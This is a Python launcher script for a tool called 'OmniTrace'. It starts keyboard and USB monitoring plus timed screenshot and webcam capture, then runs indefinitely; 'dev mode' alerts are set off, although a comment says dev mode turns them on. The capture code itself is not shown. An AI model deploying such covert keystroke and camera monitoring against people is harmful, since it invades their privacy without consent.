from engine import OmniTraceBase
from sensors import OmniSensors
from visuals import OmniVisuals
import threading

def run_project():
    # 1. Start Engine (Dev Mode = Alerts On)
    core = OmniTraceBase(dev_mode=False)

    # --- AUTO-CLEANUP SECTION ---
    #core.auto_cleanup(days_to_keep=3) 
    # ----------------------------
    
    # 2. Start Sensors (Keyboard & USB)
    sensors = OmniSensors(core)
    sensors.start()
    
    # 3. Start Visuals (Screenshots & Webcam)
    visuals = OmniVisuals(core)
    # Visuals need to run in a thread to keep the program alive
    threading.Thread(target=visuals.run_timers, daemon=True).start()

    core.log_event("--- OMNI-TRACE FULL SYSTEM ONLINE ---")
    
    # Keep the main thread alive forever
    import time
    while True:
        time.sleep(60)

if __name__ == "__main__":
    run_project()